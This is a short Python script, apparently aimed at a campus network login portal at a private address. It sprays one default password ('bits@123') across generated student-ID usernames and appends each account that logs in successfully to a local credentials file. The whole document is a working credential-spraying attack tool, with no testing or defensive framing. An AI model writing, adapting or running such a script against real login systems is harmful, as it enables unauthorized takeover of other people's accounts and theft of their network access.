import mechanize, bs4

url = "http://172.16.0.30:8090/"
f = file("savedCreds.txt", "a")

br = mechanize.Browser();
br.set_handle_robots(False)

print("Script running.")
for i in range(2013,2018):
	print(i)
	for j in range (2000):
		if i < 2017:
			if j > 1000:
				break
			else:
				login = "f" + str(i) + str(j) 
		else:
			if j < 1000:
				login = "f" + str(i) + "0" + str(j)
			else:
				login = "f" + str(i) + str(j)
		
		password = "bits@123" 
		
		try:
			br.open(url)
			br.select_form(name = "frmHTTPClientLogin")
			br["username"] = login
			br["password"] = password
			response = br.submit()
			content = response.read()
		except KeyboardInterrupt:
			raise
		except:
			continue
		
		#Parse the xml response 
		soup = bs4.BeautifulSoup(content, "xml")
		messageTag = soup.select("message")[0]
		message = messageTag.get_text()
		if "successfully" in message:
			print(login)
			f.write(login + " " + password +"\n")
print("Done.")		